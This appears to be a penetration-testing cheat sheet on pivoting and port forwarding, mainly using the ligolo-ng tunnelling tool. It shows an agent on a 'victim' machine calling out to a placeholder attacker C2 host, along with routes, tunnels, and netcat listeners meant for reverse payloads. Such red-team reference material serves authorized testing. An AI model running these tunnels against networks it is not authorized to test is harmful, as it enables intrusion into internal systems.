---
description: >-
  Lateral Movement consists of techniques that adversaries use to enter and
  control remote systems on a network.
---

# 🪜 Pivoting & Portforwarding

## SSH

```bash
ssh -L 8080:acuity@203.0.113.50:8080 # Local portforward
```

## ligolo-ng

{% hint style="info" %}
Official Link: [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
{% endhint %}

### &#x20;**Running Ligolo-ng proxy server**

Start the _proxy_ server on your Command and Control (C2) server (default port 11601):

{% code overflow="wrap" %}
```bash
./proxy -h # Help options
./proxy -autocert # Automatically request LetsEncrypt certificates
```
{% endcode %}

### Using Ligolo-ng

Start the _agent_ on your target (victim) computer (no privileges are required!):

```bash
./agent -connect attacker_c2_server.com:11601
```

> If you want to tunnel the connection over a SOCKS5 proxy, you can use the `--socks ip:port` option. You can specify SOCKS credentials using the `--socks-user` and `--socks-pass` arguments.

A session should appear on the _proxy_ server.

```bash
INFO[0102] Agent joined. name=nchatelain@nworkstation remote="XX.XX.XX.XX:38000"
```

### Use the `session` command to select the _agent_.

```bash
ligolo-ng » session 
Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000
```

\
Add a route on the _proxy/relay_ server to the _192.168.0.0/24_ _agent_ network.

_Linux_:

```bash
sudo ip route add 192.168.0.0/24 dev ligolo
```

_Windows_:

```powershell
netsh int ipv4 show interfaces

Idx     Mét         MTU          État                Nom
---  ----------  ----------  ------------  ---------------------------
 25           5       65535  connected     ligolo
   
route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if [THE INTERFACE IDX]
```

### Start the tunnel on the proxy

```bash
[Agent : nchatelain@nworkstation] » start_tunnel
[Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   
```

### Agent Binding/Listening

You can listen to ports on the _agent_ and _redirect_ connections to your control/proxy server.

In a ligolo session, use the `listener_add` command.

The following example will create a TCP listening socket on the agent (0.0.0.0:1234) and redirect connections to the 4321 port of the proxy server.

```
[Agent : nchatelain@nworkstation] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
INFO[1208] Listener created on remote agent!            
```

On the `proxy`:

```
$ nc -lvp 4321
```

When a connection is made on the TCP port `1234` of the agent, `nc` will receive the connection.

This is very useful when using reverse tcp/udp payloads.

You can view currently running listeners using the `listener_list` command and stop them using the `listener_stop [ID]` command:

```
[Agent : nchatelain@nworkstation] » listener_list 
┌───────────────────────────────────────────────────────────────────────────────┐
│ Active listeners                                                              │
├───┬─────────────────────────┬────────────────────────┬────────────────────────┤
│ # │ AGENT                   │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │
├───┼─────────────────────────┼────────────────────────┼────────────────────────┤
│ 0 │ nchatelain@nworkstation │ 0.0.0.0:1234           │ 127.0.0.1:4321         │
└───┴─────────────────────────┴────────────────────────┴────────────────────────┘

[Agent : nchatelain@nworkstation] » listener_stop 0
INFO[1505] Listener closed.                             
```
